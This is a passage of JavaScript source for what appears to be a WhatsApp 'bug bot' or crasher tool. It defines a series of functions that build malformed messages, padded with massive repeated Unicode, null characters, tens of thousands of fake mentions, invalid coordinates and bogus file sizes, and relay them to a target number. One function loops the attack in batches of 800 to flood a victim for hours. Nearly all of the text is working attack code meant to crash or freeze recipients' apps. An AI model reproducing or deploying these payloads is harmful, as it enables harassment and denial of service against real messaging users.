            nativeFlowResponseMessage: {
              name: "menu_options",
              paramsJson: "\u0000".repeat(999999),
              version: 3
            },
            contextInfo: {
              isForwarded: true,
              forwardingScore: 9741
            }
          }
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING"
        }
      }
    },
    description: "X"
  }, {
    participant: { jid: target }
  });
}
async function RedWariorLoca(target) {
  try {
    const payload = {
      viewOnceMessage: {
        message: {
          videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7119-24/21416858_2558442404498210_7729407464837294349_n.enc",
            mimetype: "video/mp4",
            fileName: "redwarrior.mp4",
            fileLength: "999999999",
            seconds: 99999,
            caption: "Red Warior Crash By Telegram: t.me/sonicwarior"
          },
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 35.3606,
                degreesLongitude: 138.7274,
                name: "Red Warior",
                address: "Red Warior"
              }
            },
            body: {
              text: "🔴 System Bug By: t.me/sonicwarior"
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "Red Warior",
                    id: "rw_crash"
                  })
                }
              ],
              messageParamsJson: JSON.stringify({
                text: "Red Warior",
                footer: "Version 1"
              })
            }
          },
          contextInfo: {
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  conversation: "Payload Confirmed",
                  contextInfo: {
                    quotedMessage: {
                      viewOnceMessage: {
                        message: {
                          conversation: "Red Warior..."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    };

    const msg = await generateWAMessageFromContent(jid, payload, { quoted: null });
    await sock.relayMessage(jid, msg.message, { messageId: generateMessageID() });
  } catch {}
}
async function spamNotif(target, Ptcp = true) {
    let virtex = "RANZZ COLDD" + "ꦾ".repeat(90000) + "@8".repeat(90000);
    await sock.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "ɪᴅɪᴏᴛs",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function boegProtocol(target) {
  try {
    let parse = false;
    let type = `image/webp`;

   if (11 > 9) {
    parse = parse ? false : true;
  }

    let locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000".repeat(5000) + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      address: "\u0000".repeat(5000) + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
      url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
    };

    const msg1 = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          locationMessage,
        },
      },
    }, {});
    
    let stickerMessage = {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256:  "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: type,
          directPath:  "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1000 * 40 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        };

    const msg2 = generateWAMessageFromContent(target, {
  viewOnceMessage: { 
             message: { 
             stickerMessage 
             },
           },
         }, 
      {});

    for (const msg of [msg1, msg2]) {
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      });
    }

    console.log(chalk.red(`Success Sent New Bulldozer`));

  } catch (err) {
    console.error(err);
  }
}
async function ZerosBlankX(target, ptcp = true) {
  const Vampire = `_*~@8~*_\n`.repeat(10500);
  const CrashNotif = 'ꦽ'.repeat(55555);

  await sock.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "𝐙𝐞𝐫𝐨𝐬 𝐃𝐢𝐜𝐭𝐢𝐯𝐞",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: 'RANZZZ WANGSHAPP' + CrashNotif + Vampire,
            },
            footer: {
              text: '',
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "𝐓𝐡𝐞 𝐙𝐞𝐫𝐨𝐬",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}
async function VampSuperDelay(target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "Vampire Crash" + "ោ៝".repeat(10000),
        title: "Iqbhalkeifer",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.youtube.com/@iqbhalkeifer25",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "V A M P I R E  H E R E ! ! !",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "VampClouds"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
async function FreezeFileInvis(target, Ptcp = true) {
    let anjays = "slayer" + "ြ".repeat(25000) + "@1".repeat(60000);
    await sock.relayMessage(target, {
            message: {
                ViewOnceMessage: {
                    message: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "NtahMengapa..",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "bapakkau",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: anjays
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "status@broadcast")
            }
          }
        }
    }, { participant: { jid: mentionedJid, target } }, { messageId: null });
}
async function CrashFcKipop(target) {
  try {
    await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "- Kipop",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: 992.999999,
                degreesLongitude: -932.8889989,
                name: "\u900A",
                address: "\u0007".repeat(20000),
              },
            },
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "X",
              mentionedJid: ["0@s.whatsapp.net"],
            },
            body: {
              text: "- Kipop",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(500000),
            },
          },
        },
      },
    }, {
      participant: { jid: target },
      messageId: null,
    });

    for (let i = 0; i < 1; i++) {
      const messageContent = {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "- Kipop ",
                format: "DEFAULT"
              },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(10000),
                version: 3
              }
            }
          }
        }
      };

      await sock.relayMessage(target, messageContent, {
        participant: { jid: target }
      });

      await new Promise(resolve => setTimeout(resolve, 300));
    }

  } catch (err) {
    console.error(err);
  }
}
async function zerosUi(target, Ptcp = true) {
  try {
    await sock.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "RAAANZ̤\n" +
                  "ꦾ".repeat(92000) +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "zeros",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function Payload(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: { text: "\u0000" },
            nativeFlowMessage: {
              buttons: [
                { name: "single_select", buttonParamsJson: "" },
                { name: "call_permission_request", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, { participant: { jid: target } });
  } catch (err) {
    console.log(err);
  }
}

async function noclick(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "💥⃟༑⌁⃰𝗡͖͜𝗘𞋯͡𝗕͋͢͜𝗨̸͔͋͡𝗟̸͋͢͜𝗔",
              hasMediaAttachment: false,
            },
            body: {
              text: "𝗖͡𝗥͖⃰͜𝗔̐͢͡𝗦̸͔̐͜𝗛̐͢͡𝗘͔̐͜𝗥̐͢͡",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "z",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}

async function Bug2(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "𝙏𝙝𝙚 𝘿𝙚𝙨𝙩𝙧𝙤𝙮𝙚𝙧",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
async function AxnForceClose(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
            },
            body: {
              text: "‌A‌‌l‌‌k‌a‌‌x‌‌N‌a‌‌y‌ ",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({ status: true }),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({ status: true }),
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(target, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}
async function VampireGroupInvis(target, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "Vampire.Firebase" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0018".repeat(50000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "Vampire Official",
                    },
                ],
            },
        };

        await sock.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}
async function FlowX(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
            },
            body: {
              text: " ㅤ ㅤ ㅤ ㅤ ㅤ",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: venomModsData + "\u0000",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: venomModsData + "𝐍𝐮𝐥𝐥 𝐂𝐫𝐚𝐬𝐡𝐞𝐫🐉",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}
async function ZerosVisible(target, mention) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "You Loser ×_×",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "𝖹𝖾𝗋𝗈𝗌𝗌"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await sock.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Zeros Are Destroyers" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function sendMessagesForDurationX(durationHours, target) {
const totalDurationMs = durationHours * 60 * 60 * 1000; // Konversi jam ke milidetik
const startTime = Date.now();
let count = 0;

const sendNext = async () => {
if (Date.now() - startTime >= totalDurationMs) {
console.log("Pengiriman Selesai Sesuai Durasi Yang Ditentukan.");
return;
}

if (count < 800) {
await ZerosVisible(target, false); // Menggunakan target dari input pengguna
count++;
console.log(chalk.red(`Mengirimkan Paket ${count}/800 ke ${target}`));
   sendNext(); // Melanjutkan pengiriman
   console.clear();
} else {
console.log(chalk.green(`Selesai Mengirimkan 800 Paket Ke ${target}`)); // Log selesai kirim 800 paket
count = 0; // Reset untuk paket berikutnya
console.log(chalk.red("Menyiapkan Untuk Mengirim 800 Paket Berikutnya..."));
setTimeout(sendNext, 5000); // Jeda 5 detik setelah selesai batch 800 pesan
}
};

sendNext();
};
async function locxd(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          locationMessage: {
            name: "yong sarag",
            address: "sarah",
            comment: "sarah",
            accuracyInMeters: 1,
            degreesLatitude: 111.45231,
            degreesLongitude: 111.45231,
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 35000,
                  },
                  () =>
                    "628" +
                    Math.floor(Math.random() * 10000000000) +
                    "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 999999,
              isForwarded: true,
            },
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(target, message, {});

    let statusid;
    statusid = await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });
  } catch (err) {
    console.log(err);
  }
}
async function VampireNewUi(target, Ptcp = true) {
  try {
    await sock.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "𝚅𝙰𝙼𝙿𝙸𝚁𝙴 𝙸𝚂 𝙱𝙰𝙲𝙺̤\n" +
                  "ꦾ".repeat(92000) +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Vamp",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

    async function VampireiPhone(target) {
      try {
        await sock.relayMessage(
          target,
          {
            extendedTextMessage: {
              text: "ᐯ4ᗰᑭIᖇᗴ IOՏ̊",
              contextInfo: {
                stanzaId: "1234567890ABCDEF",
                participant: target,
                quotedMessage: {
                  callLogMesssage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [
                      {
                        jid: target,
                        callOutcome: "1",
                      },
                    ],
                  },
                },
                remoteJid: target,
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 9999999,
                isForwarded: true,
                quotedAd: {
                  advertiserName: "Example Advertiser",
                  mediaType: "IMAGE",
                  jpegThumbnail:
